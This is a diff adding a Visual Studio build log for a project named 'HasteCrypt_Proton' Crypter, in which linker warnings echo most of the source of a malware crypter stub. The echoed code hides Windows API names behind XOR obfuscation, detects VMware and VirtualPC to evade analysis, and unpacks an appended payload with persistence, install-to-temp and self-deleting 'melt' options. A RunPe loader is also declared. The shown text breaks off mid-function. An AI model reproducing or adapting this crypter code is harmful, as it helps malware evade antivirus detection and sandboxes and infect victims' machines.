@@ -1,0 +1,561 @@
+﻿La génération a démarré 21/09/2015 14:14:06.
+     1>Projet "C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Crypter\Crypter.vcxproj" sur le nœud 2 (Build cible(s)).
+     1>ClCompile:
+         C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\bin\CL.exe /c /ZI /nologo /W0 /WX- /Od /Oy- /D WIN32 /D _DEBUG /D _WINDOWS /D _USING_V110_SDK71_ /D _MBCS /Gm /RTC1 /MT /GS /fp:precise /Zc:wchar_t /Zc:forScope /Fo"Debug\\" /Fd"Debug\vc110.pdb" /Gd /TP /analyze- /errorReport:prompt crypter.cpp
+         crypter.cpp
+       Link:
+         C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\bin\link.exe /ERRORREPORT:PROMPT /OUT:"C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Debug\Crypter.exe" /INCREMENTAL /NOLOGO kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /MANIFEST /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /manifest:embed /DEBUG /PDB:"C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Debug\Crypter.pdb" /SUBSYSTEM:WINDOWS,"5.01" /OPT:NOICF /ORDER:@"crypter.cpp" /LTCG /TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:"C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Debug\Crypter.lib" /MACHINE:X86 Debug\crypter.obj
+     1>LINK : warning LNK4075: ' /INCREMENTAL' ignoré à cause de la spécification '/LTCG'
+     1>crypter.obj : warning LNK4075: ' /EDITANDCONTINUE' ignoré à cause de la spécification '/OPT:LBR'
+         LINK : /LTCG spécifié mais aucune génération de code requise ; supprimez /LTCG de la ligne de commande de l'édition de liens pour améliorer les performances de l'éditeur de liens
+     1>crypter.cpp : warning LNK4037: '_#define _SCL_SECURE_NO_DEPRECATE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_#define _CRT_SECURE_NO_DEPRECATE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_#define WINVER 0x0500' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_#include <windows.h>' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_#include <stdio.h>' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef FARPROC(WINAPI *T_GetProcAddress) (HMODULE hModule, LPCSTR  lpProcName)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef HMODULE(WINAPI *T_GetModuleHandleA) (LPCTSTR lpModuleName)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_CreateProcess) (LPCTSTR               lpApplicationName,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPTSTR                lpCommandLine,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPSECURITY_ATTRIBUTES lpProcessAttributes,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPSECURITY_ATTRIBUTES lpThreadAttributes,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BOOL                  bInheritHandles,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD                 dwCreationFlags,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID                lpEnvironment,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR               lpCurrentDirectory,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPSTARTUPINFO         lpStartupInfo,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPPROCESS_INFORMATION lpProcessInformation)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetProcAddress pGetProcAddress' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetModuleHandleA pGetModuleHandleA' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_CreateProcess pCreateProcess' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_void RunPe(LPSTR szFilePath, LPVOID pFile)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE kernel32dllStr[] = { 105, 160, 124, 27, 251, 69, 148, 61, 29, 212, 179, 185, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char processPath[MAX_PATH + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE *payload' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE *persist' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BOOL dotNet' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_#define KEY "7858861095312029000296069230427283565840413005017481720689923373222505610511467564476193731867120671846836681056397512171512137433691113398220396671813843193362330232752833549352279565327213358851602712359924223360267184711765576784386559731878388486720439001534979559607251601173892660280366435402030664706355474429868401009768849020560469799787733685074343638195373961614189131181196956170894334842766461114721773795088818075059131204578416618867339086155595318250166276443741156222406259136625418492821679752885333213979427487323269469215490411544642908330225121824900217824368766518067644109386267438995608962154183677774203174992169147589026324687071514159585319548537567537076998450301910984286336495640255088829683201832273638734526470279435416717727691458383175976377031788722771104618260077923854212362601222752189152487754894638909516508763238364904437714239992827500721490571062288784609993245888435007152691629854727042094489733731092308776080253473547131223487991156738814088637824972754"' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PCONTEXT ctx = ep->ContextRecord' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_ctx->Ebx = -1' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_ctx->Eip += 4' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return EXCEPTION_CONTINUE_EXECUTION' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_// we can safely resume execution since we skipped faulty instruction' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_// High level language friendly version of IsInsideVPC()' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_bool IsInsideVPC()' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_bool rc = false' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '___try' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm push ebx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm mov  ebx, 0 // It will stay ZERO if VPC is running' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm mov  eax, 1 // VPC function number' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_// call VPC' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm __emit 0Fh' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm __emit 3Fh' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm __emit 07h' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm __emit 0Bh' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm test ebx, ebx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm setz[rc]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '__asm pop ebx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_// The except block shouldn't get triggered if VPC is running!!' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '___except (IsInsideVPC_exceptionFilter(GetExceptionInformation()))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return rc' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_bool IsInsideVMWare()' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_bool rc = true' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '___try' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '___asm' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_push   edx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_push   ecx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_push   ebx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_mov    eax, 'VMXh'' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_mov    ebx, 0 // any value but not the MAGIC VALUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_mov    ecx, 10 // get VMWare version' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_mov    edx, 'VX' // port number' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_in     eax, dx // read port' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_// on return EAX returns the VERSION' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_cmp    ebx, 'VMXh' // is it a reply from VMWare?' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_setz[rc] // set return value' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pop    ebx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pop    ecx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pop    edx' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '___except (EXCEPTION_EXECUTE_HANDLER)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_rc = false' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return rc' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_void Obf(BYTE *data, int dataSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_srand(0x1917)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_for (int i = 0' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_data[i] ^= KEY[i % (sizeof(KEY) - 1)]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_data[i] ^= rand()' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_data[i] ^= 0' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_int CALLBACK WinMain(' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_HINSTANCE hInstance,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_HINSTANCE hPrevInstance,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPSTR     lpCmdLine,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_int       nCmdShow)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(kernel32dllStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE loadLibaryAstr[] = { 110, 170, 111, 17, 210, 64, 197, 125, 82, 194, 166, 148, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(loadLibaryAstr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef HMODULE(WINAPI *T_LoadLibrary) (LPCTSTR lpFileName)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_LoadLibrary pLoadLibraryA = (T_LoadLibrary)GetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)loadLibaryAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE msvcrtStr[] = { 79, 182, 120, 22, 236, 93, 137, 107, 95, 220, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(msvcrtStr, 10)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE memcpyStr[] = { 79, 160, 99, 22, 238, 80, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(memcpyStr, 6)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pLoadLibraryA((char *)msvcrtStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef void(*T_memcpy) (void *dest, const void *src, size_t count)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_memcpy pMemcpy = (T_memcpy)GetProcAddress(GetModuleHandleA((char *)msvcrtStr), (char *)memcpyStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getProcAddressStr[] = { 101, 160, 122, 37, 236, 70, 196, 78, 87, 212, 173, 176, 36, 150, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getProcAddressStr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetProcAddress = (T_GetProcAddress)GetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)getProcAddressStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getModuleHandleAstr[] = { 101, 160, 122, 56, 241, 77, 210, 99, 86, 248, 190, 187, 51, 137, 75, 86, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getModuleHandleAstr, 16)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetModuleHandleA = (T_GetModuleHandleA)pGetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)getModuleHandleAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE createProcessAstr[] = { 97, 183, 107, 20, 234, 76, 247, 125, 92, 211, 186, 166, 36, 164, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(createProcessAstr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pCreateProcess = (T_CreateProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)createProcessAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_FILE *fp' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char *file = "test.txt"' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_fp = fopen(file, "w")' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (fp != NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_fclose(fp)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DeleteFile(file)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getModuleFileNameAstr[] = { 101, 160, 122, 56, 241, 77, 210, 99, 86, 246, 182, 185, 50, 171, 79, 122, 103, 216, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getModuleFileNameAstr, 18)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef DWORD(WINAPI *T_GetModuleFileNameA) (HMODULE hModule, LPTSTR  lpFilename, DWORD nSizeKD)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetModuleFileNameA pGetModuleFileNameA = (T_GetModuleFileNameA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getModuleFileNameAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetModuleFileNameA(NULL, processPath, MAX_PATH)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (strcmp(GetCommandLine(), "-"))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_STARTUPINFO si = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PROCESS_INFORMATION pi = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_si.cb = sizeof(si)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pCreateProcess(processPath, "-", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(pi.hProcess)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(pi.hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return TRUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE createFileAstr[] = { 97, 183, 107, 20, 234, 76, 225, 102, 95, 213, 158, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(createFileAstr, 11)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef HANDLE(WINAPI *T_CreateFile) (' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPCTSTR lpFileName,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD dwDesiredAccess,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD dwShareMode,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPSECURITY_ATTRIBUTES lpSecurityAttributes,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD dwCreationDisposition,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD dwFlagsAndAttributes,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_HANDLE hTemplateFile)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_CreateFile pCreateFileA = (T_CreateFile)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)createFileAstr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_HANDLE file = pCreateFileA(processPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD length = GetFileSize(file, NULL)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE heapAllocStr[] = { 106, 160, 111, 5, 223, 69, 203, 96, 80, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(heapAllocStr, 9)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef LPVOID(WINAPI *T_HeapAlloc) (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_HeapAlloc pHeapAlloc = (T_HeapAlloc)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)heapAllocStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getProcessHeapStr[] = { 101, 160, 122, 37, 236, 70, 196, 106, 64, 195, 151, 176, 54, 149, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getProcessHeapStr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef HANDLE(WINAPI *T_GetProcessHeap) (void)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetProcessHeap pGetProcessHeap = (T_GetProcessHeap)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getProcessHeapStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE *data = (BYTE *)pHeapAlloc(pGetProcessHeap(), 0, length)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD read' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE readFileStr[] = { 112, 160, 111, 17, 216, 64, 203, 106, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(readFileStr, 8)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_ReadFile) (HANDLE hFile,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPVOID lpBuffer,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD nNumberOfBytesToRead,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPDWORD lpNumberOfBytesRead,' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_LPOVERLAPPED lpOverlapped)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ReadFile pReadFile = (T_ReadFile)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)readFileStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (!pReadFile(file, data, length, &read, NULL))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_STARTUPINFO si = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_PROCESS_INFORMATION pi = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_si.cb = sizeof(si)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pCreateProcess(processPath, "", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(pi.hProcess)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(pi.hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(file)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return TRUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_CloseHandle(file)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE *payloadOffset = data + read - sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_int delay' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&delay, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&dotNet, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BOOL antis' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&antis, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_const int strSize = 26' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (antis)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (IsInsideVMWare() || IsInsideVPC())' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_return TRUE' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= strSize' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char keyName[strSize]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(keyName, payloadOffset, strSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf((BYTE *)keyName, strSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= strSize' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char fileName[strSize]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(fileName, payloadOffset, strSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf((BYTE *)fileName, strSize)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&persist, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BOOL install' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&install, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BOOL melt' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_payloadOffset -= sizeof(int)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pMemcpy(&melt, payloadOffset, sizeof(int))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (install)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char installPath[MAX_PATH]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE getTempPathStr[] = { 101, 160, 122, 33, 251, 68, 215, 95, 82, 196, 183, 148, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(getTempPathStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef DWORD(WINAPI *T_GetTempPath) (DWORD nBufferLength, LPTSTR lpBuffer)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_GetTempPath pGetTempPath = (T_GetTempPath)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getTempPathStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pGetTempPath(MAX_PATH, installPath)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_strcat(installPath, fileName)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_char *currFileName' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_for (int i = strlen(processPath)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (installPath[i] == '\\')' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_currFileName = &processPath[i + 1]' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_break' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (strcmp(fileName, currFileName))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
